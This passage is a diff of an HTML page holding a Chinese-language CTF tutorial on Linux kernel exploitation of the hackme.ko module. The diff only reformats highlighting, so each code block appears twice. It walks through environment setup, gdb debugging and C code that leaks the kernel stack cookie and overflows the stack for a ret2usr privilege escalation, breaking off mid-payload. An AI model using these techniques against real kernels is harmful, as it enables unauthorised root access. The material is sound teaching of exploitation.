@@ -10,7 +10,6 @@
 <meta property="og:url" content="/posts/2-linux%E5%86%85%E6%A0%B8%E5%88%A9%E7%94%A8/linux%E5%86%85%E6%A0%B8%E5%88%A9%E7%94%A8-part-2-%E5%89%AF%E6%9C%AC/" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2023-02-05T15:36:08+08:00" />
 <meta property="article:modified_time" content="2023-02-05T15:36:08+08:00" /><meta property="og:site_name" content="湖南大学安全Wiki" />
-
 <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="Linux内核利用 part 2"/>
 <meta name="twitter:description" content="前言 在本系列中，我将介绍过去几周学习的Linux内核利用的一些基本内容：从基本环境配置到流行的Linux内核保护措施，以及相应的利用技术。 当"/>
@@ -109,25 +108,25 @@
 </ul>
 <h5 id="内核">内核</h5>
 <p>Linux内核通常以<code>vmlinuz</code>或<code>bzImage</code>的名称给出，它是称为<code>vmlinux</code>的内核映像的压缩版本。可以使用<code>gzip</code>、<code>bzip2</code>、<code>lzma</code>等不同的压缩方案。我在这里使用<strong>extract-image.sh</strong>脚本来提取内核ELF文件：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">$ ./extract-image.sh ./vmlinuz &gt; vmlinux
-</code></pre></div><p>提取内核映像是为了在其中找到ROP配件。如果你熟悉用户级pwn，那么你就知道什么是<code>ROP</code>，它在内核中没有什么不同（我们将在后面看到）。我个人更喜欢使用<code>ROPgadget</code>来做这项工作：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">$ ROPgadget --binary ./vmlinux &gt; gadgets.txt
-</code></pre></div><p>与简单的用户级程序不同，内核映像<strong>很大</strong>。因此，你将等很长时间，<code>ROPgadget</code>才能找到所有配件。所以在开始时就立即进行查找比较好。同时应该将输出保存到一个文件中以免多次运行<code>ROPgadget</code>来查找不同的配件。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ./extract-image.sh ./vmlinuz &gt; vmlinux
+</span></span></code></pre></div><p>提取内核映像是为了在其中找到ROP配件。如果你熟悉用户级pwn，那么你就知道什么是<code>ROP</code>，它在内核中没有什么不同（我们将在后面看到）。我个人更喜欢使用<code>ROPgadget</code>来做这项工作：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ROPgadget --binary ./vmlinux &gt; gadgets.txt
+</span></span></code></pre></div><p>与简单的用户级程序不同，内核映像<strong>很大</strong>。因此，你将等很长时间，<code>ROPgadget</code>才能找到所有配件。所以在开始时就立即进行查找比较好。同时应该将输出保存到一个文件中以免多次运行<code>ROPgadget</code>来查找不同的配件。</p>
 <h5 id="文件系统">文件系统</h5>
 <p>同样，这是一个压缩文件，我使用脚本<strong>decompress.sh</strong>进行解压：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">mkdir initramfs
-<span class="nb">cd</span> initramfs
-cp ../initramfs.cpio.gz .
-gunzip ./initramfs.cpio.gz
-cpio -idm &lt; ./initramfs.cpio
-rm initramfs.cpio
-</code></pre></div><p>运行脚本后得到目录<code>initramfs</code>，它看起来像Linux机器上文件系统的根目录。我们看到易受攻击的内核模块<code>hackme.ko</code>也包含在根目录中。我们将把它复制到其他地方，稍后进行分析。
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mkdir initramfs
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> initramfs
+</span></span><span class="line"><span class="cl">cp ../initramfs.cpio.gz .
+</span></span><span class="line"><span class="cl">gunzip ./initramfs.cpio.gz
+</span></span><span class="line"><span class="cl">cpio -idm &lt; ./initramfs.cpio
+</span></span><span class="line"><span class="cl">rm initramfs.cpio
+</span></span></code></pre></div><p>运行脚本后得到目录<code>initramfs</code>，它看起来像Linux机器上文件系统的根目录。我们看到易受攻击的内核模块<code>hackme.ko</code>也包含在根目录中。我们将把它复制到其他地方，稍后进行分析。
 解压这个文件不仅可以获得易受攻击的模块，还可以根据我们的需要修改文件系统中的某些内容。
 首先，我们可以查看<code>/etc</code>目录，因为大多数引导后运行的初始化脚本都存储在这里。我们在其中一个文件（通常是<code>rcS</code>或<code>inittab</code>）中查找以下行，然后修改它：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">setuidgid <span class="m">1000</span> /bin/sh
-<span class="c1"># Modify it into the following</span>
-setuidgid <span class="m">0</span> /bin/sh
-</code></pre></div><p>这一行代码的目的是在引导后生成一个UID为<code>1000</code>的非根shell。将UID修改为<code>0</code>之后，我们将在启动时得到一个根shell。你也许想问：我们为什么要这样做？实际上，这看起来相当矛盾。因为我们的目标是利用内核模块来获得根权限，而不是修改文件系统（当然，我们不能修改题目的远程服务器上的文件系统）。这里的根本原因只是为了简化利用过程。在使用利用代码时，有些文件包含对我们有用的信息，但它们需要root权限来读取。例如：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">setuidgid <span class="m">1000</span> /bin/sh
+</span></span><span class="line"><span class="cl"><span class="c1"># Modify it into the following</span>
+</span></span><span class="line"><span class="cl">setuidgid <span class="m">0</span> /bin/sh
+</span></span></code></pre></div><p>这一行代码的目的是在引导后生成一个UID为<code>1000</code>的非根shell。将UID修改为<code>0</code>之后，我们将在启动时得到一个根shell。你也许想问：我们为什么要这样做？实际上，这看起来相当矛盾。因为我们的目标是利用内核模块来获得根权限，而不是修改文件系统（当然，我们不能修改题目的远程服务器上的文件系统）。这里的根本原因只是为了简化利用过程。在使用利用代码时，有些文件包含对我们有用的信息，但它们需要root权限来读取。例如：</p>
 <ul>
 <li><code>/proc/kallsyms</code>列出了加载到内核中的所有符号的地址</li>
 <li><code>/sys/module/core/sections/.text</code>显示了内核的<code>.text</code>部分的地址，这也是它的基址（本题中没有<code>/sys</code>目录，但可以从<code>/proc/kallsyms</code>中检索基址）。</li>
@@ -136,28 +135,28 @@ setuidgid <span class="m">0</span> /bin/sh
 <p>运行利用代码时要记得改回<code>1000</code>，以免利用时误报（你以为得到了根shell，其实并没有)。</p>
 </blockquote>
 <p>其次，解压文件系统，稍后将利用程序放进去。修改后，使用<strong>compress.sh</strong>脚本将其压缩回指定格式：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">gcc -o exploit -static <span class="nv">$1</span>
-mv ./exploit ./initramfs
-<span class="nb">cd</span> initramfs
-find . -print0 <span class="se">\
-</span><span class="se"></span><span class="p">|</span> cpio --null -ov --format<span class="o">=</span>newc <span class="se">\
-</span><span class="se"></span><span class="p">|</span> gzip -9 &gt; initramfs.cpio.gz
-mv ./initramfs.cpio.gz ../
-</code></pre></div><p>前两行编译利用代码并将其放入文件系统。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gcc -o exploit -static <span class="nv">$1</span>
+</span></span><span class="line"><span class="cl">mv ./exploit ./initramfs
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> initramfs
+</span></span><span class="line"><span class="cl">find . -print0 <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span><span class="p">|</span> cpio --null -ov --format<span class="o">=</span>newc <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span><span class="p">|</span> gzip -9 &gt; initramfs.cpio.gz
+</span></span><span class="line"><span class="cl">mv ./initramfs.cpio.gz ../
+</span></span></code></pre></div><p>前两行编译利用代码并将其放入文件系统。</p>
 <h5 id="qemu运行脚本">qemu运行脚本</h5>
 <p>最初，给定的<strong>run.sh</strong>看起来像这样：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">qemu-system-x86_64 <span class="se">\
-</span><span class="se"></span>    -m 128M <span class="se">\
-</span><span class="se"></span>    -cpu kvm64,+smep,+smap <span class="se">\
-</span><span class="se"></span>    -kernel vmlinuz <span class="se">\
-</span><span class="se"></span>    -initrd initramfs.cpio.gz <span class="se">\
-</span><span class="se"></span>    -hdb flag.txt <span class="se">\
-</span><span class="se"></span>    -snapshot <span class="se">\
-</span><span class="se"></span>    -nographic <span class="se">\
-</span><span class="se"></span>    -monitor /dev/null <span class="se">\
-</span><span class="se"></span>    -no-reboot <span class="se">\
-</span><span class="se"></span>    -append <span class="s2">&#34;console=ttyS0 kaslr kpti=1 quiet panic=1&#34;</span>
-</code></pre></div><p>部分标志含义：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">qemu-system-x86_64 <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -m 128M <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -cpu kvm64,+smep,+smap <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -kernel vmlinuz <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -initrd initramfs.cpio.gz <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -hdb flag.txt <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -snapshot <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -nographic <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -monitor /dev/null <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -no-reboot <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -append <span class="s2">&#34;console=ttyS0 kaslr kpti=1 quiet panic=1&#34;</span>
+</span></span></code></pre></div><p>部分标志含义：</p>
 <ul>
 <li><code>-m</code>指定内存大小。如果无法启动模拟器，可以试着增加内存大小。</li>
 <li><code>-cpu</code>指定CPU模型。我们可以在此处给SMEP和SMAP缓解功能添加<code>+smep</code>和<code>+smap</code>（稍后详细介绍）。</li>
@@ -170,9 +169,9 @@ mv ./initramfs.cpio.gz ../
 <p>本题使用<code>-hdb</code>将<code>flag.txt</code>放到<code>/dev/sda</code>中，而不是将其作为一个普通文件留在系统中。这可能是为了防止pwn选手使用一些CTF小伎俩作弊，也可能只是为了让题目环境更易部署。</p>
 </blockquote>
 <p>首先，添加<code>-s</code>选项（这个选项允许我们从主机上远程调试模拟器内核）。之后正常启动模拟器，然后在主机上运行：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">$ gdb vmlinux
-<span class="o">(</span>gdb<span class="o">)</span> target remote localhost:1234
-</code></pre></div><p>然后就可以正常调试系统内核，就像在普通用户进程中使用<code>gdb</code>一样。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ gdb vmlinux
+</span></span><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> target remote localhost:1234
+</span></span></code></pre></div><p>然后就可以正常调试系统内核，就像在普通用户进程中使用<code>gdb</code>一样。</p>
 <blockquote>
 <p>在远程调试内核时，有时<code>peda</code>、<code>pwndbg</code>和<code>GEF</code>表现地很奇怪，你可以用<code>gdb ——nx vmlinux</code>命令禁用它们。</p>
 </blockquote>
@@ -191,39 +190,39 @@ mv ./initramfs.cpio.gz ../
 <h4 id="分析内核模块">分析内核模块</h4>
 <p>这个模块非常简单。首先，在<code>hackme_init()</code>中用以下操作注册一个名为<code>hackme</code>的设备：<code>hackme_read</code>, <code>hackme_write</code>, <code>hackme_open</code>和<code>hackme_release</code>。这意味着我们可以通过打开<code>/dev/hackme</code>与这个模块通信，并对其执行读写操作。
 在设备上执行读写操作会调用内核中的<code>hackme_read()</code>或<code>hackme_write()</code>，它们的代码如下（使用IDA pro并省略了一些不相关内容）：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="n">ssize_t</span> <span class="kr">__fastcall</span> <span class="nf">hackme_write</span><span class="p">(</span><span class="n">file</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="n">loff_t</span> <span class="o">*</span><span class="n">off</span><span class="p">)</span>
-<span class="p">{</span>   
-    <span class="c1">//...
-</span><span class="c1"></span>    <span class="kt">int</span> <span class="n">tmp</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
-    <span class="c1">//...
-</span><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span> <span class="n">_size</span> <span class="o">&gt;</span> <span class="mh">0x1000</span> <span class="p">)</span>
-    <span class="p">{</span>
-        <span class="n">_warn_printk</span><span class="p">(</span><span class="s">&#34;Buffer overflow detected (%d &lt; %lu)!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">4096LL</span><span class="p">,</span> <span class="n">_size</span><span class="p">);</span>
-        <span class="n">BUG</span><span class="p">();</span>
-    <span class="p">}</span>
-    <span class="n">_check_object_size</span><span class="p">(</span><span class="n">hackme_buf</span><span class="p">,</span> <span class="n">_size</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
-    <span class="k">if</span> <span class="p">(</span> <span class="n">copy_from_user</span><span class="p">(</span><span class="n">hackme_buf</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">v5</span><span class="p">)</span> <span class="p">)</span>
-        <span class="k">return</span> <span class="o">-</span><span class="mi">14LL</span><span class="p">;</span>
-    <span class="n">_memcpy</span><span class="p">(</span><span class="n">tmp</span><span class="p">,</span> <span class="n">hackme_buf</span><span class="p">);</span>
-    <span class="c1">//...
-</span><span class="c1"></span><span class="p">}</span>
-
-<span class="n">ssize_t</span> <span class="kr">__fastcall</span> <span class="nf">hackme_read</span><span class="p">(</span><span class="n">file</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="n">loff_t</span> <span class="o">*</span><span class="n">off</span><span class="p">)</span>
-<span class="p">{</span>   
-    <span class="c1">//...
-</span><span class="c1"></span>    <span class="kt">int</span> <span class="n">tmp</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
-    <span class="c1">//...
-</span><span class="c1"></span>    <span class="n">_memcpy</span><span class="p">(</span><span class="n">hackme_buf</span><span class="p">,</span> <span class="n">tmp</span><span class="p">);</span>
-    <span class="k">if</span> <span class="p">(</span> <span class="n">_size</span> <span class="o">&gt;</span> <span class="mh">0x1000</span> <span class="p">)</span>
-    <span class="p">{</span>
-        <span class="n">_warn_printk</span><span class="p">(</span><span class="s">&#34;Buffer overflow detected (%d &lt; %lu)!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">4096LL</span><span class="p">,</span> <span class="n">_size</span><span class="p">);</span>
-        <span class="n">BUG</span><span class="p">();</span>
-    <span class="p">}</span>
-    <span class="n">_check_object_size</span><span class="p">(</span><span class="n">hackme_buf</span><span class="p">,</span> <span class="n">_size</span><span class="p">,</span> <span class="mi">1LL</span><span class="p">);</span>
-    <span class="n">v6</span> <span class="o">=</span> <span class="n">copy_to_user</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">hackme_buf</span><span class="p">,</span> <span class="n">_size</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">;</span>
-    <span class="c1">//...
-</span><span class="c1"></span><span class="p">}</span>
-</code></pre></div><p>这两个函数的漏洞非常明显：它们都读/写一个长度为0x80字节的栈缓冲区，但只有大小大于0x1000时才警告缓冲区溢出。我们可以利用该漏洞自由地读/写内核栈。
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">ssize_t</span> <span class="kr">__fastcall</span> <span class="nf">hackme_write</span><span class="p">(</span><span class="n">file</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="kt">loff_t</span> <span class="o">*</span><span class="n">off</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>   
+</span></span><span class="line"><span class="cl">    <span class="c1">//...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">int</span> <span class="n">tmp</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span> <span class="n">_size</span> <span class="o">&gt;</span> <span class="mh">0x1000</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">_warn_printk</span><span class="p">(</span><span class="s">&#34;Buffer overflow detected (%d &lt; %lu)!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">4096LL</span><span class="p">,</span> <span class="n">_size</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">BUG</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">_check_object_size</span><span class="p">(</span><span class="n">hackme_buf</span><span class="p">,</span> <span class="n">_size</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="nf">copy_from_user</span><span class="p">(</span><span class="n">hackme_buf</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">v5</span><span class="p">)</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">14LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">_memcpy</span><span class="p">(</span><span class="n">tmp</span><span class="p">,</span> <span class="n">hackme_buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">ssize_t</span> <span class="kr">__fastcall</span> <span class="nf">hackme_read</span><span class="p">(</span><span class="n">file</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="kt">loff_t</span> <span class="o">*</span><span class="n">off</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>   
+</span></span><span class="line"><span class="cl">    <span class="c1">//...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">int</span> <span class="n">tmp</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">_memcpy</span><span class="p">(</span><span class="n">hackme_buf</span><span class="p">,</span> <span class="n">tmp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">_size</span> <span class="o">&gt;</span> <span class="mh">0x1000</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">_warn_printk</span><span class="p">(</span><span class="s">&#34;Buffer overflow detected (%d &lt; %lu)!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">4096LL</span><span class="p">,</span> <span class="n">_size</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">BUG</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">_check_object_size</span><span class="p">(</span><span class="n">hackme_buf</span><span class="p">,</span> <span class="n">_size</span><span class="p">,</span> <span class="mi">1LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v6</span> <span class="o">=</span> <span class="nf">copy_to_user</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">hackme_buf</span><span class="p">,</span> <span class="n">_size</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span></code></pre></div><p>这两个函数的漏洞非常明显：它们都读/写一个长度为0x80字节的栈缓冲区，但只有大小大于0x1000时才警告缓冲区溢出。我们可以利用该漏洞自由地读/写内核栈。
 现在，让我们看看怎样使用上面的原语得到根权限。首先从尽可能简单的保护功能开始：栈cookie。</p>
 <h4 id="最简单的利用ret2usr">最简单的利用——ret2usr</h4>
 <h5 id="概念">概念</h5>
@@ -233,125 +232,125 @@ mv ./initramfs.cpio.gz ../
 由于这是本系列的第一个技术，我将一步一步地解释利用过程。</p>
 <h5 id="打开设备">打开设备</h5>
 <p>在与模块交互之前，我们必须先打开它。打开设备和打开普通文件一样简单：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="n">global_fd</span><span class="p">;</span>
-
-<span class="kt">void</span> <span class="nf">open_dev</span><span class="p">(){</span>
-    <span class="n">global_fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&#34;/dev/hackme&#34;</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
-	<span class="k">if</span> <span class="p">(</span><span class="n">global_fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
-		<span class="n">puts</span><span class="p">(</span><span class="s">&#34;[!] Failed to open device&#34;</span><span class="p">);</span>
-		<span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
-	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[*] Opened device&#34;</span><span class="p">);</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-</code></pre></div><p>现在我们就可以读写<code>global_fd</code>了。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">global_fd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">open_dev</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">    <span class="n">global_fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/dev/hackme&#34;</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">global_fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">		<span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[!] Failed to open device&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="nf">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[*] Opened device&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>现在我们就可以读写<code>global_fd</code>了。</p>
 <h5 id="栈cookie泄漏">栈cookie泄漏</h5>
 <p>因为我们可以读任意栈，栈cookie泄漏很简单。栈上的<code>tmp</code>缓冲区0x80字节长，栈cookie紧随其后。因此，如果我们将数据读到一个无符号长数组（每个元素8字节），cookie的偏移量将是16：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">cookie</span><span class="p">;</span>
-
-<span class="kt">void</span> <span class="nf">leak</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
-    <span class="kt">unsigned</span> <span class="n">n</span> <span class="o">=</span> <span class="mi">20</span><span class="p">;</span>
-    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">leak</span><span class="p">[</span><span class="n">n</span><span class="p">];</span>
-    <span class="n">ssize_t</span> <span class="n">r</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">global_fd</span><span class="p">,</span> <span class="n">leak</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">leak</span><span class="p">));</span>
-    <span class="n">cookie</span> <span class="o">=</span> <span class="n">leak</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
-
-    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] Leaked %zd bytes</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">r</span><span class="p">);</span>
-    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] Cookie: %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">cookie</span><span class="p">);</span>
-<span class="p">}</span>
-</code></pre></div><h5 id="覆盖返回地址">覆盖返回地址</h5>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">cookie</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">leak</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="n">n</span> <span class="o">=</span> <span class="mi">20</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">leak</span><span class="p">[</span><span class="n">n</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">ssize_t</span> <span class="n">r</span> <span class="o">=</span> <span class="nf">read</span><span class="p">(</span><span class="n">global_fd</span><span class="p">,</span> <span class="n">leak</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">leak</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cookie</span> <span class="o">=</span> <span class="n">leak</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Leaked %zd bytes</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">r</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Cookie: %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">cookie</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h5 id="覆盖返回地址">覆盖返回地址</h5>
 <p>与栈cookie泄漏相同，我们将创建一个无符号长数组，然后在索引值为16处用泄漏的cookie覆盖原cookie。需要注意的是，与用户程序不同，这个内核函数从栈中弹出<code>rbx</code>, <code>r12</code>, <code>rbp</code>3个寄存器，而不仅仅是<code>rbp</code>（可以在反汇编函数时清楚地看到）。因此，我们必须在cookie后面放3个虚拟值。其后放希望程序返回的返回地址，它是我们在用户空间上精心设计以得到根权限的函数。我称之为<code>escalate_privs</code>：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">overflow</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
-    <span class="kt">unsigned</span> <span class="n">n</span> <span class="o">=</span> <span class="mi">50</span><span class="p">;</span>
-    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">payload</span><span class="p">[</span><span class="n">n</span><span class="p">];</span>
-    <span class="kt">unsigned</span> <span class="n">off</span> <span class="o">=</span> <span class="mi">16</span><span class="p">;</span>
-    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">cookie</span><span class="p">;</span>
-    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// rbx
-</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// r12
-</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// rbp
-</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">escalate_privs</span><span class="p">;</span> <span class="c1">// ret
-</span><span class="c1"></span>
-    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[*] Prepared payload&#34;</span><span class="p">);</span>
